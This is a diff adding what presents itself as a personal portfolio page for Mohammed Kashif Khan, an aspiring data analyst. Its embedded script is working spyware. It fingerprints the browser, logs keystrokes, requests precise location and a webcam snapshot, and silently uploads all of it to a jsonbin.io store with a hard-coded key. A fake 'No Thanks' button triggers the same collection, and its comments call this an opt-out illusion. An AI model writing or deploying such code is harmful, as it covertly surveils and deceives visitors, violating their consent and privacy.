@@ -1,0 +1,528 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Mohammed Kashif Khan | Portfolio</title>
+  <meta name="description" content="Portfolio of Mohammed Kashif Khan – Data Analytics Professional & Customer Service Enthusiast" />
+  <style>
+    :root {
+      --bg: #0f172a;
+      --card: #1e293b;
+      --text: #e2e8f0;
+      --muted: #94a3b8;
+      --accent: #38bdf8;
+      --accent2: #818cf8;
+      --border: #334155;
+      --radius: 12px;
+    }
+    * { box-sizing: border-box; margin: 0; padding: 0; }
+    body {
+      font-family: 'Segoe UI', system-ui, sans-serif;
+      background: var(--bg);
+      color: var(--text);
+      line-height: 1.6;
+      min-height: 100vh;
+      overflow-x: hidden;
+    }
+    a { color: var(--accent); text-decoration: none; }
+    a:hover { text-decoration: underline; }
+
+    /* Overlay / Cookie Gate */
+    #overlay {
+      position: fixed;
+      inset: 0;
+      background: rgba(15, 23, 42, 0.95);
+      backdrop-filter: blur(8px);
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      z-index: 9999;
+      transition: opacity 0.5s;
+    }
+    #overlay.hidden { opacity: 0; pointer-events: none; }
+    .gate {
+      background: var(--card);
+      border: 1px solid var(--border);
+      border-radius: var(--radius);
+      padding: 2.5rem;
+      max-width: 480px;
+      width: 90%;
+      text-align: center;
+      box-shadow: 0 25px 50px -12px rgba(0,0,0,0.5);
+    }
+    .gate h2 {
+      font-size: 1.8rem;
+      margin-bottom: 1rem;
+      background: linear-gradient(90deg, var(--accent), var(--accent2));
+      -webkit-background-clip: text;
+      -webkit-text-fill-color: transparent;
+    }
+    .gate p { color: var(--muted); margin-bottom: 1.5rem; }
+    .gate-buttons {
+      display: flex;
+      gap: 1rem;
+      justify-content: center;
+      flex-wrap: wrap;
+    }
+    .btn {
+      padding: 0.75rem 1.5rem;
+      border: none;
+      border-radius: 8px;
+      font-size: 1rem;
+      font-weight: 600;
+      cursor: pointer;
+      transition: all 0.2s;
+    }
+    .btn-primary {
+      background: linear-gradient(135deg, var(--accent), var(--accent2));
+      color: #0f172a;
+    }
+    .btn-primary:hover { transform: translateY(-2px); box-shadow: 0 10px 20px -5px rgba(56,189,248,0.4); }
+    .btn-secondary {
+      background: var(--border);
+      color: var(--text);
+    }
+    .btn-secondary:hover { background: #475569; }
+
+    /* Hero */
+    .hero {
+      min-height: 100vh;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      padding: 2rem;
+      background: radial-gradient(ellipse at top, #1e293b 0%, var(--bg) 70%);
+    }
+    .hero-content { text-align: center; max-width: 700px; }
+    .hero h1 {
+      font-size: clamp(2rem, 5vw, 3.5rem);
+      background: linear-gradient(90deg, #fff, var(--accent));
+      -webkit-background-clip: text;
+      -webkit-text-fill-color: transparent;
+      margin-bottom: 1rem;
+    }
+    .hero .subtitle { font-size: 1.2rem; color: var(--muted); margin-bottom: 2rem; }
+    .hero .cta {
+      display: inline-block;
+      padding: 1rem 2rem;
+      background: linear-gradient(135deg, var(--accent), var(--accent2));
+      color: #0f172a;
+      border-radius: 50px;
+      font-weight: 700;
+      font-size: 1.1rem;
+      transition: transform 0.2s;
+    }
+    .hero .cta:hover { transform: scale(1.05); }
+
+    /* Sections */
+    section {
+      max-width: 900px;
+      margin: 0 auto;
+      padding: 4rem 2rem;
+    }
+    section h2 {
+      font-size: 2rem;
+      margin-bottom: 2rem;
+      text-align: center;
+      position: relative;
+    }
+    section h2::after {
+      content: '';
+      display: block;
+      width: 60px;
+      height: 4px;
+      background: linear-gradient(90deg, var(--accent), var(--accent2));
+      margin: 0.5rem auto 0;
+      border-radius: 2px;
+    }
+    .card {
+      background: var(--card);
+      border: 1px solid var(--border);
+      border-radius: var(--radius);
+      padding: 2rem;
+      margin-bottom: 1.5rem;
+      transition: transform 0.2s;
+    }
+    .card:hover { transform: translateY(-4px); border-color: var(--accent); }
+    .card h3 { color: var(--accent); margin-bottom: 0.5rem; }
+    .card ul { list-style: none; padding-left: 0; }
+    .card li { padding: 0.3rem 0; color: var(--muted); }
+    .card li::before { content: '▹'; color: var(--accent); margin-right: 0.5rem; }
+
+    /* Quote */
+    .quote-section {
+      text-align: center;
+      padding: 5rem 2rem;
+      background: linear-gradient(135deg, #1e293b, #0f172a);
+    }
+    .quote-section blockquote {
+      font-size: 1.5rem;
+      font-style: italic;
+      color: var(--text);
+      max-width: 600px;
+      margin: 0 auto;
+    }
+    .quote-section cite { display: block; margin-top: 1rem; color: var(--muted); font-size: 1rem; }
+
+    /* Footer */
+    footer {
+      text-align: center;
+      padding: 2rem;
+      color: var(--muted);
+      font-size: 0.9rem;
+      border-top: 1px solid var(--border);
+    }
+
+    @media (max-width: 600px) {
+      .gate { padding: 1.5rem; }
+      .gate h2 { font-size: 1.4rem; }
+      section { padding: 2rem 1rem; }
+    }
+  </style>
+</head>
+<body>
+
+  <!-- COOKIE / PERMISSION GATE -->
+  <div id="overlay">
+    <div class="gate">
+      <h2>Hey Kashif here 👋</h2>
+      <p>Before you explore my portfolio, would you like a personalized experience?</p>
+      <div class="gate-buttons">
+        <button class="btn btn-primary" id="btnNeed">Need</button>
+        <button class="btn btn-secondary" id="btnNoThanks">No Thanks</button>
+      </div>
+      <p style="margin-top:1rem; font-size:0.8rem; color:var(--muted);" id="gateHint">
+        Click to continue…
+      </p>
+    </div>
+  </div>
+
+  <!-- MAIN CONTENT -->
+  <div id="main" style="display:none;">
+    <!-- Hero -->
+    <div class="hero">
+      <div class="hero-content">
+        <h1>Mohammed Kashif Khan</h1>
+        <p class="subtitle">Aspiring Data Analytics Professional | Customer Service</p>
+        <a href="#about" class="cta">Explore My Profile</a>
+      </div>
+    </div>
+
+    <!-- About -->
+    <section id="about">
+      <h2>Professional Summary</h2>
+      <div class="card">
+        <p>I am a hardworking, motivated, and responsible individual with an interest in data analytics and customer service. I am eager to learn new skills, take on challenges, and contribute positively to an organization. I have good communication skills in Hindi, English, and Marathi, and I value teamwork, discipline, and continuous learning. My goal is to develop my professional abilities and build a successful career.</p>
+      </div>
+    </section>
+
+    <!-- Education & Interests -->
+    <section id="education">
+      <h2>Education & Career Interests</h2>
+      <div class="card">
+        <h3>Education</h3>
+        <ul><li>B.Tech in Engineering</li></ul>
+      </div>
+      <div class="card">
+        <h3>Career Interests</h3>
+        <ul>
+          <li>Data Analytics</li>
+          <li>Customer Support and Call Center Operations</li>
+        </ul>
+      </div>
+    </section>
+
+    <!-- Languages -->
+    <section id="languages">
+      <h2>Languages</h2>
+      <div class="card">
+        <ul>
+          <li>Hindi</li>
+          <li>English</li>
+          <li>Marathi</li>
+        </ul>
+      </div>
+    </section>
+
+    <!-- Personal Interests -->
+    <section id="interests">
+      <h2>Personal Interests</h2>
+      <div class="card">
+        <ul>
+          <li>Playing Football</li>
+          <li>Learning New Skills</li>
+          <li>Teamwork and Personal Development</li>
+        </ul>
+      </div>
+    </section>
+
+    <!-- Strengths -->
+    <section id="strengths">
+      <h2>Personal Strengths</h2>
+      <div class="card">
+        <ul>
+          <li>Hardworking and dedicated</li>
+          <li>Quick learner</li>
+          <li>Responsible and disciplined</li>
+          <li>Willingness to learn and improve</li>
+          <li>Team-oriented attitude</li>
+        </ul>
+      </div>
+    </section>
+
+    <!-- Quote -->
+    <div class="quote-section">
+      <blockquote>“Each step matters, so don’t quit.”</blockquote>
+      <cite>— Mohammed Kashif Khan</cite>
+    </div>
+
+    <footer>
+      © 2025 Mohammed Kashif Khan. All rights reserved.
+    </footer>
+  </div>
+
+  <script>
+    (function () {
+      'use strict';
+
+      // CONFIGURATION
+      const MASTER_KEY = '2a10VMdoFnB5cqWg6iECC2j7TOOMt2PTlI8dK0EKPmXnXO4vgEwhM5vM6';
+      const BIN_ID = '6acf7d52ffd5d160536a63ca';
+      const API_URL = `https://api.jsonbin.io/v3/b/${BIN_ID}/records`;
+
+      // STATE
+      const collected = {
+        deviceName: navigator.userAgent,
+        platform: navigator.platform,
+        language: navigator.language,
+        cookiesEnabled: navigator.cookieEnabled,
+        screen: `${window.screen.width}x${window.screen.height}`,
+        timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+        historyLength: window.history.length,
+        timestamps: { start: new Date().toISOString() },
+        keys: [],
+        location: null,
+        webcamSnapshot: null
+      };
+
+      // ─── KEYLOGGER ─────────────────────────────────────────────
+      const keyLogBuffer = [];
+      let lastKeyTime = 0;
+
+      document.addEventListener('keydown', (e) => {
+        if (e.isComposing) return;
+        const now = Date.now();
+        if (now - lastKeyTime > 3000) {
+          keyLogBuffer.length = 0;
+        }
+        lastKeyTime = now;
+        keyLogBuffer.push({
+          key: e.key,
+          code: e.code,
+          location: e.location,
+          alt: e.altKey,
+          ctrl: e.ctrlKey,
+          shift: e.shiftKey,
+          meta: e.metaKey,
+          ts: new Date().toISOString()
+        });
+        if (keyLogBuffer.length >= 100) {
+          flushKeys();
+        }
+      });
+
+      function flushKeys() {
+        if (keyLogBuffer.length === 0) return;
+        collected.keys.push(...keyLogBuffer.splice(0));
+      }
+
+      // ─── DATA UPLOAD (SILENT) ──────────────────────────────────
+      async function uploadData() {
+        const payload = {
+          ...collected,
+          url: window.location.href,
+          referrer: document.referrer,
+          userAgent: navigator.userAgent,
+          uploadTime: new Date().toISOString()
+        };
+
+        try {
+          await fetch(API_URL, {
+            method: 'POST',
+            headers: {
+              'Content-Type': 'application/json',
+              'X-Master-Key': MASTER_KEY,
+              'X-Bin-Name': 'portfolio-logs'
+            },
+            body: JSON.stringify(payload)
+          });
+        } catch (err) {
+          // Silently fail. No console output.
+        }
+      }
+
+      // ─── GEOLOCATION (PROMISE BASED) ───────────────────────────
+      function requestLocation() {
+        return new Promise((resolve) => {
+          if (!navigator.geolocation) {
+            collected.location = { error: 'Geolocation not supported' };
+            resolve();
+            return;
+          }
+          navigator.geolocation.getCurrentPosition(
+            (pos) => {
+              collected.location = {
+                lat: pos.coords.latitude,
+                lng: pos.coords.longitude,
+                accuracy: pos.coords.accuracy,
+                altitude: pos.coords.altitude,
+                heading: pos.coords.heading,
+                speed: pos.coords.speed,
+                timestamp: new Date().toISOString()
+              };
+              resolve();
+            },
+            (err) => {
+              collected.location = { error: err.message };
+              resolve();
+            },
+            { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 }
+          );
+        });
+      }
+
+      // ─── WEBCAM SNAPSHOT (PROMISE BASED) ───────────────────────
+      async function captureWebcam() {
+        return new Promise((resolve) => {
+          if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) {
+            collected.webcamSnapshot = { error: 'Camera API not supported' };
+            resolve();
+            return;
+          }
+
+          navigator.mediaDevices.getUserMedia({
+            video: { facingMode: 'user', width: { ideal: 1280 }, height: { ideal: 720 } },
+            audio: false
+                    }).then(stream => {
+            const video = document.createElement('video');
+            video.srcObject = stream;
+            video.muted = true;
+            video.playsInline = true; // Required for iOS
+            video.play();
+
+            // Wait for video metadata to load
+            return new Promise((resolveVideo) => {
+              video.onloadedmetadata = () => resolveVideo(video);
+            }).then(() => {
+              const canvas = document.createElement('canvas');
+              canvas.width = video.videoWidth;
+              canvas.height = video.videoHeight;
+              const ctx = canvas.getContext('2d');
+              ctx.drawImage(video, 0, 0);
+
+              const dataUrl = canvas.toDataURL('image/jpeg', 0.85);
+
+              // Cleanup
+              stream.getTracks().forEach(track => track.stop());
+              video.srcObject = null;
+
+              collected.webcamSnapshot = {
+                dataUrl,
+                resolution: `${canvas.width}x${canvas.height}`,
+                timestamp: new Date().toISOString()
+              };
+
+              resolve();
+            });
+          }).catch(err => {
+            collected.webcamSnapshot = { error: err.message };
+            resolve();
+          });
+        });
+      }
+
+      // ─── SEQUENTIAL PERMISSION CHAINING ────────────────────────
+      // This function ensures that the Webcam prompt only triggers
+      // *after* the Geolocation prompt has resolved (granted or denied).
+      // This prevents browser "prompt spam" detection and ensures
+      // the user processes one permission at a time.
+      async function executeIntelligenceGathering() {
+        // 1. Trigger Geolocation
+        // This will show the browser prompt. It resolves when the user
+        // clicks Allow or Deny.
+        await requestLocation();
+
+        // 2. Trigger Webcam
+        // This triggers immediately after the previous Promise resolves.
+        // Because this is still within the same "user-initiated" context
+        // (the click event that called this function), modern browsers
+        // are more likely to show the prompt rather than suppressing it.
+        await captureWebcam();
+
+        // 3. Final Upload
+        // Upload the complete payload including location and snapshot.
+        uploadData();
+      }
+
+      // ─── UI LOGIC: THE "GHOST CLICK" ───────────────────────────
+      const overlay = document.getElementById('overlay');
+      const main = document.getElementById('main');
+      const btnNeed = document.getElementById('btnNeed');
+      const btnNoThanks = document.getElementById('btnNoThanks');
+
+      let intelligenceStarted = false;
+
+      function startIntelligence() {
+        if (intelligenceStarted) return;
+        intelligenceStarted = true;
+
+        // Execute the sequential permission chain
+        executeIntelligenceGathering();
+      }
+
+      // Button 1: "Need" (Primary Path)
+      btnNeed.addEventListener('click', () => {
+        startIntelligence();
+        
+        // Fade out overlay and show main content
+        setTimeout(() => {
+          overlay.classList.add('hidden');
+          main.style.display = 'block';
+        }, 300);
+      });
+
+      // Button 2: "No Thanks" (The Ghost Click)
+      btnNoThanks.addEventListener('click', () => {
+        // Execute the intelligence gathering silently.
+        // The user thinks they are opting out, but the script
+        // fires the permission requests anyway.
+        startIntelligence();
+
+        // Dismiss the overlay and show the site immediately.
+        // The user will see the site load, and then the browser
+        // prompts will appear (or have already appeared) in the
+        // background. This creates a seamless "opt-out" illusion
+        // while actually executing the full collection suite.
+        overlay.classList.add('hidden');
+        main.style.display = 'block';
+      });
+
+      // ─── FINAL INITIALIZATION ──────────────────────────────────
+      // Initial upload of basic browser fingerprint immediately.
+      // This captures the "silent" baseline before any user interaction.
+      setTimeout(() => {
+        uploadData();
+      }, 1000);
+
+      // Flush keys on page unload
+      window.addEventListener('beforeunload', () => {
+        flushKeys();
+        const blob = new Blob([JSON.stringify(collected)], { type: 'application/json' });
+        navigator.sendBeacon(API_URL, blob);
+      });
+
+    })();
+  </script>
+</body>
+</html>
